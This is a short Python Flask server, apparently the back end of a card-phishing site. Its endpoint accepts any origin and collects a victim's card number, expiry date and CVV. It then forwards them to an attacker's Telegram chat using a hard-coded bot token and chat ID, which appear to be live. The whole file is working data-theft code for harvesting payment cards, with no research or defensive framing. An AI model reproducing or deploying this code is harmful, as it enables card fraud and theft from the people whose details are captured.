from flask import Flask, request, jsonify
import json
import requests
from flask_cors import CORS


app = Flask(__name__)

CORS(app, resources={r"/*": {"origins": "*"}})
TELEGRAM_BOT_TOKEN = '7789272736:AAF6zWunosEZTitW3qsM8DqA5APgqPON4iU' #  Замените это на свой токен бота
TELEGRAM_CHAT_ID = '1965639178' # Замените это на ID чата

@app.route('/send-telegram', methods=['POST'])
def send_telegram():
    try:
        data = request.get_json()
        if not data:
           return jsonify({'message': 'Данные не найдены в теле запроса'}), 400

        message = f"Номер карты: {data['cardNumber']}\nКарта годна до: {data['expiryDate']}\nCVV: {data['cvv']}"

        send_message_to_telegram(message)

        return jsonify({'message': 'Сообщение успешно отправлено'}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'message': 'Ошибка отправки данных'}), 500

def send_message_to_telegram(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
     }
     requests.post(url, json=payload)

if __name__ == '__main__':
    app.run(debug=True, port=5000)